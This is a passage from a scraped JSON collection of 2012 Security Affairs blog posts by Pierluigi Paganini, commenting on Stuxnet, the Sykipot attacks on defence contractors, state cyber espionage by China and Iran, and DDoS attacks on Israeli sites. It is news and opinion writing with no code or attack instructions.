manufacturers of control systems and governments, hoping that security will become a requirement in the design phase.\n\nPierluigi Paganini\n\nReferences\n\nhttps://threatpost.com/en_us/blogs/why-stuxnet-attacks-arent-going-away-012712\n\nhttp://threatpost.com/en_us/blogs/stuxnet-expert-langner-analysis-shows-design-flaw-not-vulnerability-sunk-siemens-011912\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/control-systems", "topic_name": "control systems"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada-system", "topic_name": "SCADA system"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}]}, {"news_name": "Chinese Attacks on Defense Contractors, 2 clues are evidence", "news_link": "https://securityaffairs.co/wordpress/2113/hacking/chinese-attacks-on-defense-contractors-2-clues-are-evidence.html", "title": "Chinese Attacks on Defense Contractors, 2 clues are evidence\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 29, 2012", "body": "It\u2019s not first time and the news itself doesn\u2019t rapresent a surprise, once again Chinese hacker groups are involved in cyber intelligence operations against western companies with the intent to steal critical information. Symantec Researchers have proved the involvement of Chinese groups in attacks alerting the international community regarding the target attacked, including major U.S. defense contractors.\n\n\nThe trend is established, most often to obtain information regarding activities of the Government hackers prefer to attack private companies that collaborate with it, commonly referred to as contractors. This targets are often more exposed despite the government ask to the contractors the compliance with specific standards regarding the information management implemented to guarantee the confidentiality and integrity of data stored.  Government of China is accused to systematically attacking the computer networks of the western governments and corporations. Beijing is successfully stealing research and development, software source code, manufacturing know-how and government plans. The shadow of China is behind the famous unauthorized network access events at several U.S. defense contractors, and that they may also be responsible for the RSA SecurID breach as well ot the massive attacks against Japan istitutions. We are facing with a new \u2018cold war\u2019, but this time the challenge is to obtain dominance in cyberspace.\n\nJust contractors and relationships with governments in the security chain are considered weak links, as potentially vulnerable interface between very different worlds. Economic crisis, constant cuts to many aspects of manufacturing processes, safety first and foremost, have led to an exposure difficult to manage. Given the increasing number of attacks recorded against these figures it is essential that relationships with contractors are constantly being reviewed and revised by the authorities in order to avoid data breach potentially dangerous. Needless to lock down facilities when you leave the keys in the lock, the keys are represented by their own contractors careless and ignorant to the safety aspects of technological change we are seeing.\n\nQuestionable whether the outsourcing of many government activities can be really useful, if in fact often in this way can reduce the direct costs we must take into account the indirect costs related to management of risk of information exposure, that frequently has become real.\n\nAfter this my personal reflection lets come back to the discovered attacks, the attacks have use malicious PDF documents exploiting an Adobe Reader bug patched last month to infect Windows PCs with trojan \u201cSykipot\u201d. As described in my previous article Sykipot is a trojan with feature of backdoor already used in other attacks against U.S PKI infrastructures based on smart cards.\n\nThe vulnerability involved the application\u2019s Universal 3D file format (U3D) and could allow attackers the ability to remotely take over an infected system, cause system crashes, and conduct denial of service exploits.\n\nThe Symantec researchers have discovered one of the main server, the machine that phisically mantains more that 100 malformed PDF, used during the attack is located in Beijing and hosted by one of the country\u2019s largest Internet service providers not yet identified. More in detail Symatec researchers have discovered a real architecture used for the attacks that include also other machines responsible of the modification of the maliciuos PDF documents, activity necessary to avoid the antivirus action on the target.\n\nAt least six Chinese ip addresses that are used to proxy or host the C&C servers. The Netbox webserver used in the C&C servers is mainly used by those who speak Chinese. In fact all the documentation to setup and learn the framework is only available in Mandarin.  In the analysis have been involved also researchers of the AlienVault security firm that have decleared that the server used in the operations are Windows based and with high probability locaded in China. It\u2019s difficult to gain certainty of this, proxies usage, routing tricks and spoofed IP addresses can be easily coordinated to give the evidence of a fake attack origin. Researchers have also collected the evidences that the hackers who connected to the staging server did so from Zhejiang province on eastern coast.\n\nA specific feature of the Sykipot attacks is an hard-code identifier of the malware used by the creator in each operation to evaluate the effectiveness of the attacks.\nSymantec has mantained a cautious position doens\u2019t link the hackers directly with Chinese Government but the clues demonstrate the origin of the attacks.\n\n\u201cBased on these insights, the attackers are familiar with the Chinese language and are using computer resources in China,\u201d Symantec stated.\n\nWhat is iteresting is the ability to exploit a zero day vulerability and also the process used to avoid antivirus actions with continuos modification to the malware, that proves that behind this operations there are skilled group that manage each attack like an ongoing project.\n\nIronically it is precisely that the company Lockheed Martin that had discovered the vulnerability used was among the victims of the attacks.\n\nIn Italy we say: <<Two clues are evidence>>\n\nPierluigi Paganini\n\nReferences\n\nhttp://www.computerworld.com/s/article/9223765/Researchers_unearth_more_Chinese_links_to_defense_contractor_attacks\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/attacks", "topic_name": "Attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/contractors", "topic_name": "Contractors"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/defense", "topic_name": "defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet-service-providers", "topic_name": "internet service providers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/investigation", "topic_name": "Investigation"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/isp", "topic_name": "ISP"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}]}, {"news_name": "Cyber \u200b\u200bchess, a game just begun", "news_link": "https://securityaffairs.co/wordpress/2065/intelligence/cyber-%e2%80%8b%e2%80%8bchess-a-game-just-begun.html", "title": "Cyber \u200b\u200bchess, a game just begun\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 27, 2012", "body": "So far this year we have witnessed an escalation of attacks against those who are considered the major superpowers on cyber warfare, U.S. and Israel. Real motivated attacks in cyberspace capable of paralyzing the critical services of the target countries and after this offensive is lawful expect a reply first under warfare matter and of course after through the official channels of politics and international relations. This first statement must lead us to a first consideration:\nin these years we are witnessing an interesting phenomenon, namely the first skirmishes and the first comparisons are usually observed just in cyber space. Careful observation of this new boundless territory provides a prime location for those wishing to anticipate intentions and policies of some of the major powers in the world, then if we cross this information with macroeconomic and political data, we can tailor information to the precious analysis of global situation.\n\n\n\nLet\u2019s try to throw down with what could be the first pieces of a similar analysis.\nPut on the table the following checkers U.S., Israel, Iran, North Korea, Japan, Russia, India, China and the European bloc, easy to identify the most active among Iran and China, which we attribute almost all of the events in cyber space, intelligence operations conducted against private companies and governments in search of intelligence and military actions aimed at destabilizing the considered country\u2019s main services.\n\nNo doubt that Iran is the most noisy nation with continue proclamations to intimidate Western Nations, but in more than one occasion I wondered if the threats are real, or they are part of a diversion strategy behind which conceal much of worrying paws, China and Russia.\n\nMany Governments are worried by China and Russia\u2019s online spying, and they are pushing to have to treat state-based covert activities as the equivalent of acts of war.\nAmerican officials have grown increasingly concerned about massive and strategic efforts by China and Russia to use U.S. network vulnerabilities to steal American know-how, they are firmly convinced that an adequate defense strategy should be implemented, and not alone, many of them are pushing it so that the U.S. engage in offensive actions with greater determination.\n\nTo own the truth, the U.S. have always been attentive to the warfare, evidence for this is that more faces were pointed out as responsible for covert operations or development of cyber weapon as Stuxnet. Officially, the U.S. government has always assumed a defensive position on the issue by denying any award, but it\u2019s clear its commitment in this area.\nWithin the U.S. government has established, however, one other current, convinced of the need for peacekeepers in cyber space, Moscow and Beijing, intended as allies against rogue states from Iran to North Korea. The alliance must be consolidated through the sharing of threat information from these states and through partnerships in operations to reduce the cyber threat. The danger of a cyber 11/9 event is a real, and even then there may be considerable loss of life, \u201ca cyber Pearl Harbor is not a question of if, but when.\u201d\n\nThe Israeli government is determined to pursue an offensive policy against those who will be involved in future attacks against the state.\nIsraeli hackers have indicated that they will conduct in the future not only simple DDOS attacks agaist the enemies, but instead will seek to cause they long term damage to the servers of financial, government and security websites, starting from the Arab world.\nThey are quite confident in the efficient protection they are developing. That will be able to prevent infiltration to national networks in future attacks.\n\nIsraeli and American intelligence agencies are convinced that if Iran were to gain the ability to build a bomb, it would be a result of its relationship with Russia, which was building a nuclear reactor for Iran at a site called Bushehr and had assisted the Iranians in their missile-development program and also thanks to Iran\u2019s clandestine relationship with the network of Abdul Qadeer Khan, the father of Pakistan\u2019s atom bomb. Don\u2019t forget that Khan have already helped Iran during the building of the uranium-enrichment facility in Natanz, the one involved in Stuxnet case.\nIt is common thought that Israel will indeed strike Iran in 2012, and this event could cause an disaster from an economic perspective and it is also serious because is alter a instable equilibrium of areas like Middle East.\n\nAnd where can we place in our board the U.E. block? I\u2019d call it \u201cdormant,\u201d of undoubted skills in warfare such Governments are confronting with a unprecedented econimic crisis. Default risk for some nations is undermining the unity of U.E. for some time in the community. They are exposed to a large risk of cyber attacks.\n\nI believe in fact that countries like Italy are now exposed to potential threats, for example to nation\u2019s power grids, energy supply, public water systems and other critical systems.\n\nInvestment in cyber security is low and the continuing downward revisions to estimates of growth of the country does not portend anything good. We are very vulnerable!\nTo conclude our chess game can not keep out outsiders such as Pakistan, Syria and North Korea, countries that enjoy a considerable technical skill and, above all that they have dangerous relations with Russia and China, many accuse them of being satellites of the same nations.\n\nI deliberately left to last India that I consider as a free beater, the Swiss of cyber space because it is without an uniquely defined political position, but with high skills and which are attributable, in my opinion, many of the cyber actions wrongly attributed to neighboring China.\nBut which is the state of the Cyber Warfare Defense And Security Of India?\nIndia is increasingly targeted for cyber espionage, cyber warfare, cyber terrorism, but its response to the same is not so energic. Consider that the India haven\u2019t still formulated a cyber warfare policy and, as usual, the word cyber security, in the Country has no meaning. This is same problem shared with a lot Countrys, awareness and threats perception has low level. There is no cyberspace crisis management plan for a Nation that has been envolved in the main criminal cyber attacks of the last months, from Stuxnet to Duqu. The scenario is so critical that NATO has requested stronger cooperation with India to counter growing cyber threats, due the growing attacks are addressing Indian critical infrastructure.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cia", "topic_name": "CIA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/india", "topic_name": "India"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}]}, {"news_name": "Iran \u2013 China Axis and the dangerous alliances", "news_link": "https://securityaffairs.co/wordpress/1938/cyber-warfare-2/iran-china-axis-and-the-dangerous-alliances.html", "title": "Iran \u2013 China Axis and the dangerous alliances\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 23, 2012", "body": "If you were to ask me what is the most frightened nation in terms of cyber offense without a doubt I say it is China.

What are the advantages?\nTo a casual eye these relationships might look like an act of philanthropy to those countries oppressed by Western supremacy, but behind the partnerships there is a specific plan to build an impenetrable fortress around a central power, a series of ramparts technology to be used to to operate in a hidden manner against countries with which it does business.\nGive me the parallels with the theory of networking, these collaborations with China are important alliances used to build its demilitarized zone (DMZ), a large region within the cyber space exposed to the enemy, from which to move offensive, but in any case far from the nerve center of its infrastructure. Do not forget also that China is among the nations that import oil from Iran. The report is therefore far from philanthropic.\n\nLet\u2019s look more closely at the relationship between China and the Iranian government.\n\nJust in the last few months we observed a more aggressive policy of the government , of Teharan continuous skirmishes with the West to show to the world its new technological capacities. Hence the extreme events that have been advertised as the hijacking of U.S. drone and also millionaires technology investments for the acquisition of modern network infrastructure, provided by Chinese giant Huawei.\n\nChina in recent years has made \u200b\u200bextensive use of cyber operations, with the purpose of information gathering and also with intent to be offensive. Cyber offensive to hit the key points of enemy countries, the information systems of banks and other institutions, no one can be considered safe. Obviously, however, so much media exposure does not benefit the business and therefore it is expected that those countries technologically close to Beijing can move similar offensives.\nWe will face with a new cyber escalation, attacks led to the strategic objectives as probably already happened, new attacks attributed to groups of Iranian and Notrh Korean hackers, or even to the \u2018 \u201cIranian Cyber \u200b\u200bArmy\u201d. From my personal point of view I have no doubt regaring the fact that Iran Cyber Army\u2019s constituent hacker groups is connected to the Iranian government, Cyber Army has proven to be always ready to attack every Ahmandinejad\u2019s oppositor.\n\nStriking the Comodo hack case, no doubt that the Certification Authority was attacked  with spy intention because its certificates are used in authentication mechanisms to some services of government agencies.\n\nTehran certainly is not hiding, he understood how important it is propaganda to intimidate their opponents blocked by the need to have a unanimous international consensus to combat it. Iran has admitted that it was so was engaged in cyber warfare, and cyber attacks are part of their strategy.\nDuring the last year several attacks have been launched from Iran against Voice of America Farsi, Dutch government-funded Radio Zamaneh, which also broadcasts in Farsi, and microblogging site Twitter. China has alse exported the concept of internet censorship implemented with Israeli technology. The Tehran government infact also blocks the majority of foreign news websites, accusing Western media of taking part in a plot by the United States, Israel and Britain-led Europe, Against the Islamic Republic.\n\nTensions rose after the Iranian nuclear program has been threatened by the worm Stuxnet, the first cyber weapon, for the development of which they are accused the Americans and Israelis.\n\nThe collaboration between China and Iran did not stop at just at warfare, anti-ship ballistic missiles have been projected with the collaboration of both governments.\n\nIn February 2011, Iran demonstrated a short-range anti-ship ballistic missile named Khalij Fars ( English: Persian Gulf ), a missile based on the Fateh-110 which successfully hit a stationary target vessel. It has been also the deployment of a short ranged ballistic missile based on the Chinese missile Dongfeng 11 (English:\u201dEast Wind) operated by the People\u2019s Republic of China.\n\nDo you think these collaborations are not really dangerous? Unfortunately the money folds all logic, while you decide for the total embargo to Iran new economic relationships are intertwined with the Chinese government, complying with the aggressive policy.\n\nLet us reflect for a moment, we are approaching the point of no return, total dependence on the Chinese market \u2026\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/censorship", "topic_name": "Censorship"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-filtering", "topic_name": "Content filtering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "Japan under cyber attack.

The first attack in the time line, in what is considerable as a real escalation, was conducted against the Japanese parliament from China according to official sources.\n\n\n\nFor the attack has been used a server located in China from which have been observed several attacks to the Japanese Lower House.   The intruders were able to have access to email and confidential documents of the room and this has made \u200b\u200bnecessary an extraordinary meeting of the executive to respond to that considered a real emergency. The number of cyber incidents is growing and despite the government\u2019s attention on cyber defense you can not halt the offensive. During the attacks the servers of Japanese lower house lawmakers have been hit causing the theft of many credentials.\n\nJapan has tried out the management of earthquake damage in 2011 and the subsequent nuclear accident in Fukushima. To confirm that the attacks are in fact military operations are the other objectives targeted. Documents on military aircraft and nuclear power plants seems have been stolen in a series of cyberattacks on Japanese defence contractor Mitsubishi Heavy.  On more than one occasion, observed attacks have hit the company always with the intent to steal valuable information, the company denies any possible theft, but history has shown that often the reality is quite different.  Mitsubishi Heavy declared in fact that last month that 83 computers at 11 of its facilities had been hit by cyberattacks but no leakage of information on products and technologies had been confirmed, that is a clear demonstration of a targeted strategy.\n\nBy analyzing the attacks some reflections are mandatory:\n\nIf there will not be a change in the policies of major governments on the above points we will can find having to deal with very dangerous situations and politically difficult to manage.\n\nPierluigi Paganini\n\nReferences \n\nhttp://thehackernews.com/2011/10/japan-under-heavy-cyber-attack.html\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attack", "topic_name": "cyber attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-gathering", "topic_name": "information gathering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/investigation", "topic_name": "Investigation"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/japan", "topic_name": "Japan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}]}, {"news_name": "Israel under a cyber warfare escalation", "news_link": "https://securityaffairs.co/wordpress/1747/cyber-warfare-2/israel-under-a-cyber-warfare-escalation.html", "title": "Israel under a cyber warfare escalation\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 17, 2012", "body": "This week has began under worse auspices worse for Israel, which, despite its attention to the cyber threats posed by cyber-space, has been victim of a series of attacks that have checkmated the government of Jerusalem.\n\nIsrael is facing with a true escalation in cyberwar, not identified attackers have in fact pulled down two principal national web sites, the Tel Aviv Stock Exchange and El Al, the national airline.\n\n\n\nThe attackers have used a DDoS attack saturating in a short time the resouces of the web sites making sites inaccessible. The situation has been restored within few hours.  Unfortunately defend against such attacks is not easy despite the offensive has not come unexpected, in fact an hacker named oxOmar, notorious for posting the details of more than 20,000 Israeli credit cards, has alerted the media on the incoming attacks by a group of pro-Palestinian cyberattackers called Nightmare.\n\nThe Web sites were accessed by an abnormal number of requests simultaneously interrupting the service erogation.\nHamas, the Islamic militant group based in Gaza, is working to make attacks on new fronts equally offensive. We must consider that Israel is one of the more technological nation considered advanced on cyber security.\n\nBut the attacks on crucial systems have not ended here, just yesterday in fact the Israeli Banking system has been under attack. It was blocked and hundreds of its clients were unable to access to its services. The attack schema is the same, simple and effective, a DDos attacks made by the group \u201cnightmare\u201d already author of the attacks to the Tel Aviv Stock Exchange and to El Al, the national airline.  The group \u201cnightmare\u201d has joined forces with the Saudi Hacker 0xOmar in what they are calling a jihadist hackers group. The media ynetnews.com reports that banking system is near to take drastic measures to protect the infrastructures even at the cost of displeasing its customers.\n\nThe perceived threat is high and must deploy every means to counter it. The battle is tough because these groups of cyber terrorists are refining the techniques of attack and the thing that most concerns is their organizzation in a united front hardly contain.\n\nAccording to experts in the field despite a significant offensive capabilities, Israel is still too vulnerable. It is necessary to define a strategy for cyber defense capable of providing protection to the main critical infrastructures of the country. Do not forget that these infrastructures are those that have proved more vulnerable to events such as the one we are discussing. Nuclear sites, medical facilities, telecommunications networks are prime targets for such attacks.4\n\nWhat is interesting is that just last week the Israeli Defense Ministry has declared that the government will establish a special cyber warfare administration.\n\nThe new administration will coordinate the efforts of security agencies and the Israeli defense industry in developing advanced systems to deal with cyber warfare. The event occurred have demonstated the urgency of this new re organizzation to be prepared to the next attacks.\n\nEvery day hundreds of cyber attacks are launched on Israel, and that the number may increase to thousands in an emergency. Overnight Thursday, hackers broke into the Israel Fire and Rescue Services website put up anti-Israel text and images.\nEarlier this week victim of an attack was the Deputy Foreign Minister Danny Ayalon. Ayalon\u2019s site was itself breached by hackers, who but didn\u2019t manage to do much more than put a 30-minute dent in the site\u2019s defenses. Ayalon\u2019s site was back up and running normally within half an hour.\nThe main actions that the government of Jerusalem intends to take are appointing a national consultant on cyber threats, the creation of national headquarters to monitor the implementation of the cyber strategy and the foundation of excellence centers skilled in cyber security that are able to define and implement defence action to protect critical infrastructures.\n\nPierluigi Paganini\n\n \n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}]}]
